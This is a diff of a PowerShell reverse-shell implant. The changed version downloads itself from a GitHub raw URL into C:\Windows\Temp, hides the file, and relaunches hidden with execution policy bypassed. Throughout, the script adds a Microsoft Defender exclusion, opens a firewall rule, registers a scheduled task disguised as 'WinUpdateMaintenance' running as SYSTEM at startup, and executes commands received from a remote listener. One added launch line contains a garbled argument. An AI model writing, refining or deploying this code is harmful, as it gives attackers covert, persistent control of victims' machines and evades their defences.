@@ -6,6 +6,7 @@ $WorkDir = "C:\Windows\Temp"
 $ScriptName = "service.ps1"
 $FullPath = Join-Path $WorkDir $ScriptName
 $TaskName = "WinUpdateMaintenance"
+$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
 # ---------------------
 
 function Log-Debug {
@@ -17,83 +18,72 @@ function Log-Debug {
 
 Log-Debug "Script initialized. Debug mode is ON."
 
-# 1. SETUP & PERSISTENCE (Runs only once or on update)
+# 1. SETUP & INSTALLATION
 if (-not (Test-Path $WorkDir)) {
     Log-Debug "Creating working directory: $WorkDir"
     New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
 }
 
-# SELF-REPLICATION & INSTALLATION
-# If we are NOT running from the WorkDir, install ourselves there and launch the hidden version
-if ($PSCommandPath -and ($PSCommandPath -ne $FullPath)) {
-    Log-Debug "Current location ($PSCommandPath) is not the target ($FullPath)."
-    Log-Debug "Replicating script to $FullPath..."
+# Check if we are running from the final destination
+$CurrentPath = $MyInvocation.MyCommand.Definition
+if ($CurrentPath -ne $FullPath) {
+    Log-Debug "Not running from $WorkDir. Installing fresh copy from GitHub..."
     try {
-        Copy-Item -Path $PSCommandPath -Destination $FullPath -Force -ErrorAction Stop
-        Log-Debug "Self-copy successful."
+        # Use TLS 1.2 for the download
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest -Uri $RemoteUrl -OutFile $FullPath -UseBasicParsing -ErrorAction Stop
+        Log-Debug "Download successful: $FullPath"
         
-        # Hide the newly created file immediately
         if (-not $DebugMode) {
             attrib +h +s $FullPath
         }
 
-        # If we are running manually, we trigger the persistent version and exit this one
-        Log-Debug "Handing off execution to the persistent copy..."
-        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
+        Log-Debug "Launching persistent process and exiting current session..."
+        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`Requested"
         exit
     } catch {
-        Log-Debug "Failed to replicate: $($_.Exception.Message)"
+        Log-Debug "Installation failed: $($_.Exception.Message)"
+        # If download fails, we try to proceed in memory anyway to at least get a shell
     }
 }
 
-# Add self-exclusion to Microsoft Defender
+# 2. SYSTEM MODIFICATIONS (Requires Admin)
 try {
-    Log-Debug "Adding Defender exclusion for $WorkDir"
+    Log-Debug "Updating Defender exclusions..."
     Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
-} catch {
-    Log-Debug "Failed to add Defender exclusion (Requires Admin)."
-}
-
-# Add Outbound Firewall Rule for the listener port
-try {
+    
+    Log-Debug "Checking Firewall rules..."
     if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
-        Log-Debug "Creating Outbound Firewall Rule for port $LPORT"
         New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
-    } else {
-        Log-Debug "Firewall rule already exists."
     }
 } catch {
-    Log-Debug "Failed to create firewall rule."
+    Log-Debug "System mods failed (Check Admin rights)."
 }
 
-# Register Scheduled Task Persistence (runs as SYSTEM at startup)
+# 3. PERSISTENCE
 try {
     if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
-        Log-Debug "Registering Scheduled Task: $TaskName"
+        Log-Debug "Registering Scheduled Task..."
         $Arg = "-ExecutionPolicy Bypass -File $FullPath"
         if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
         
         $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
         $Trigger = New-ScheduledTaskTrigger -AtStartup
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoing onBatteries
+        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
-    } else {
-        Log-Debug "Persistence task already registered."
     }
 } catch {
-    Log-Debug "Failed to register scheduled task."
+    Log-Debug "Persistence registration failed."
 }
 
-# 2. THE ENGINE (The Reverse Shell)
+# 4. THE ENGINE (The Reverse Shell)
 Log-Debug "Entering connection loop. Target: $LHOST:$LPORT"
 
 while ($true) {
     try {
-        # Attempt connection
-        Log-Debug "Attempting to connect to listener..."
         $client = New-Object System.Net.Sockets.TCPClient
         $connection = $client.BeginConnect($LHOST, $LPORT, $null, $null)
-        $wait = $connection.AsyncWaitHandle.WaitOne(3000, $false) # 3 second timeout
+        $wait = $connection.AsyncWaitHandle.WaitOne(3000, $false)
 
         if (-not $wait) {
             $client.Close()
@@ -106,34 +96,22 @@ while ($true) {
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
 
-        Log-Debug "Connected! Sending banner."
         $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
-        $writer.WriteLine("--- Running as: $(whoami) ---")
-        $writer.WriteLine("--- Debug Mode: $DebugMode ---")
+        $writer.WriteLine("--- Identity: $(whoami) ---")
+        $writer.WriteLine("--- File Path: $FullPath ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
-            
-            # Read line from the stream
             $command = $reader.ReadLine()
             
-            if ($null -eq $command) { 
-                Log-Debug "Received null command. Closing connection."
-                break 
-            }
-            
+            if ($null -eq $command) { break }
             $command = $command.Trim()
-            if ($command -eq "exit") { 
-                Log-Debug "Exit command received."
-                break 
-            }
+            if ($command -eq "exit") { break }
             if ($command -eq "") { continue }
 
-            Log-Debug "Executing command: $command"
             $output = try {
                 Invoke-Expression $command 2>&1 | Out-String
             } catch {
-                Log-Debug "Execution error: $($_.Exception.Message)"
                 "Error: " + $_.Exception.Message
             }
 
@@ -141,11 +119,9 @@ while ($true) {
             $writer.Write($output)
         }
     } catch {
-        Log-Debug "Connection failed ($($_.Exception.Message)). Retrying in 10s..."
+        Log-Debug "Retry in 10s: $($_.Exception.Message)"
         Start-Sleep -Seconds 10
     } finally {
         if ($null -ne $client) { $client.Close() }
-        if ($null -ne $reader) { $reader.Close() }
-        if ($null -ne $writer) { $writer.Close() }
     }
 }
